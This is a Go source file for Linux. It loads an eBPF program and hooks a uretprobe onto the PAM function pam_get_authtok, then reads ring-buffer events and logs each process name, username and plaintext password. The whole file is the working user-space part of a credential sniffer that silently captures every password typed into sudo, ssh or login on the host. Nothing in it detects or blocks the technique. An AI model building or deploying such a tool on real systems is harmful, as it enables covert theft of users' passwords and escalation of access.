//go:build linux

package uprobe

import (
	"bytes"
	"encoding/binary"
	"errors"
	"log"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/cilium/ebpf/rlimit"
	"golang.org/x/sys/unix"
)

//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc $BPF_CLANG -cflags $BPF_CFLAGS -target native -type event_t  bpf  uprobe.c -- -I../../headers

const PAM_FUNC = "pam_get_authtok"
const PIN_PATH = "/sys/fs/bpf/events"

type Context struct {
	objs   bpfObjects
	uplink link.Link
	rd     *ringbuf.Reader
}

func (ctx *Context) Close() {
	ctx.objs.Close()
	ctx.uplink.Close()
	if ctx.rd != nil {
		ctx.rd.Close()
	}
}

func (ctx *Context) Loadbpf(pamSoPath string) (err error) {
	if err := rlimit.RemoveMemlock(); err != nil {
		return err
	}
	objs := bpfObjects{}
	opt := &ebpf.CollectionOptions{
		Maps: ebpf.MapOptions{
			PinPath: PIN_PATH,
		},
	}
	if err := loadBpfObjects(&objs, opt); err != nil {
		log.Fatalf("loading objects: %s", err)
		return err
	}
	ctx.objs = objs
	ex, err := link.OpenExecutable(pamSoPath)
	if err != nil {
		log.Fatalf("opening executable: %s", err)
		return err
	}
	up, err := ex.Uretprobe(PAM_FUNC, objs.TracePamGetAuthtok, nil)
	if err != nil {
		log.Fatalf("creating uretprobe: %s", err)
		return err
	}
	ctx.uplink = up
	rd, err := ringbuf.NewReader(ctx.objs.Rb)
	if err != nil {
		log.Fatalf("creating perf event reader: %s", err)
		return err
	}
	ctx.rd = rd
	return nil
}

func (ctx *Context) ReadEvent() (event *bpfEventT, err error) {
	record, err := ctx.rd.Read()
	if err != nil {
		if errors.Is(err, ringbuf.ErrClosed) {
			return nil, nil
		}
		return nil, err
	}
	event = new(bpfEventT)
	err = binary.Read(bytes.NewBuffer(record.RawSample), binary.LittleEndian, event)
	if err != nil {
		return nil, err
	}
	return event, nil
}

func (ctx *Context) PrintEvent(event *bpfEventT) {
	username := unix.ByteSliceToString(event.Username[:])
	passwd := unix.ByteSliceToString(event.Password[:])
	cmd := unix.ByteSliceToString(event.Comm[:])
	log.Printf("cmd: %s, username: %s, passwd: %s", cmd, username, passwd)
}
